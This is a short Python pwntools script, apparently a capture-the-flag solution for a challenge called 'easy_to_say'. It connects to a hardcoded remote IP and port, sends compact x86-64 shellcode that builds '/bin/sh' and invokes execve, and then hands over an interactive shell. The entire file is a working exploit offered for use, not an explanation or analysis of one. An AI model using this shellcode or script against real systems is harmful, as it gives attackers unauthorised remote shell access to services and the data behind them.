from pwn import *

#p = process('./easy_to_say')

p = remote("52.69.40.204", 8361)

p.recv(1024)

shellcode = "\xb0\x3b\xbb\xf4\x2e\x73\x68\x01\xc3\x48\xc1\xe3\x20\x53\x54\x5f\xc7\x07\x2f\x62\x69\x6e\x0f\x05"

p.sendline(shellcode)

p.interactive()
